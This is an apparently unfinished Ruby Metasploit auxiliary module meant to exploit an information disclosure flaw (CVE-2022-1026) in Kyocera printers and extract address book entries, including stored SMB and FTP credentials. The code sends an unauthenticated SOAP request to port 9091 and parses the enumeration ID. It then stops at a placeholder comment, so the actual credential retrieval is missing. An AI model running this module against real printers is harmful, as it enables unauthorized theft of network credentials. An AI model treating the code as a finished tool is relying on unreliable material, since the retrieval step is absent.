class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Kyocera Printer Address Book Extractor',
      'Description'    => %q{
        This module exploits an information disclosure vulnerability in Kyocera printers
        to extract sensitive information stored in the printer address book, including
        email addresses, SMB file share credentials, and FTP credentials.
      },
      'Author'         =>
        [
          'Aaron Herndon @ac3lives (Rapid7)', # Original PoC
          'AJ Hammond @ajm4n' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://github.com/ac3lives/kyocera-cve-2022-1026']
        ],
      'DisclosureDate' => '2021-11-12'
    ))

    register_options(
      [
        Opt::RPORT(9091),
        OptString.new('TARGETURI', [true, 'The base path to the Kyocera web interface', '/ws/km-wsdl/setting/address_book']),
        OptInt.new('ENUM_DELAY', [true, 'Seconds to wait before retrieving the address book enumeration', 5])
      ]
    )
  end

  def run_host(ip)
    uri = normalize_uri(datastore['TARGETURI'])
    headers = { 'Content-Type' => 'application/soap+xml' }

    # Initial SOAP request to create an address book enumeration
    create_enum_body = <<~XML
      <?xml version="1.0" encoding="utf-8"?>
      <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book">
        <SOAP-ENV:Header>
          <wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action>
        </SOAP-ENV:Header>
        <SOAP-ENV:Body>
          <ns1:create_personal_address_enumerationRequest>
            <ns1:number>25</ns1:number>
          </ns1:create_personal_address_enumerationRequest>
        </SOAP-ENV:Body>
      </SOAP-ENV:Envelope>
    XML

    print_status("Sending initial request to create address book enumeration on #{ip}")
    res = send_request_cgi({
      'method'  => 'POST',
      'uri'     => uri,
      'headers' => headers,
      'data'    => create_enum_body
    })

    if res
      print_status("Response code: #{res.code}")
      print_status("Full response body: #{res.body}")

      # Check if there's a redirection
      if res.headers['Location']
        print_status("Redirected to: #{res.headers['Location']}")
      end

      if res.code == 200
        print_good("Enumeration creation successful on #{ip}")
        enum_id = extract_enum_id(res.body)
        
        if enum_id
          print_good("Retrieved enumeration ID: #{enum_id}. Waiting #{datastore['ENUM_DELAY']} seconds for the address book to populate.")
          sleep(datastore['ENUM_DELAY'])

          # Continue with the next steps...
        else
          print_error("Failed to retrieve enumeration ID from the response on #{ip}")
        end
      else
        print_error("Failed to create address book enumeration on #{ip}")
        print_status("Full HTML response: #{res.body}") # Add this to capture the HTML response
      end
    else
      print_error("No response received from #{ip}")
    end
  end

  def extract_enum_id(body)
    xml_doc = Nokogiri::XML(body)
    print_status("Parsed XML for enum ID: #{xml_doc.to_xml}")

    # Adjust XPath here if needed, based on the actual response
    xml_doc.at_xpath('//kmaddrbook:enumeration', 'kmaddrbook' => 'http://www.kyoceramita.com/ws/km-wsdl/setting/address_book')&.text
  end
end

